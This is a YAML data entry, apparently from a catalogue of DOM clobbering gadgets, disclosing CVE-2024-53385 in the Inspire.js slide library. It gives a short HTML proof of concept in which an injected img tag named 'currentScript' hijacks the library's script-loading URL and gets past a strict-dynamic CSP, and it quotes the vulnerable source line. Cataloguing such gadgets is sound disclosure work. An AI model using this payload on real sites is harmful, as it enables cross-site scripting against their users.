---
description: Lean, hackable, extensible slide deck framework. Create basic slides by just writing HTML and CSS, do fancy custom stuff with JS, the sky is the limit!
github: LeaVerou/inspire.js
gadgets:
  Latest:
    cve: CVE-2024-53385
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - name-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Inspire.js](https://inspirejs.org/) library uses the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/">

          <script nonce="secret" src="https://inspirejs.org/inspire.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/LeaVerou/inspire.js/blob/b09b13dbd3ddc6539dea08bf6b91af77e6e0bdc2/inspire.js#L4">https://github.com/LeaVerou/inspire.js/blob/b09b13dbd3ddc6539dea08bf6b91af77e6e0bdc2/inspire.js#L4</a>

      ```javascript
      let url = new URL("./inspire.mjs", document.currentScript ? document.currentScript.src : "https://inspire.js.org/");
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/inspire.js.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
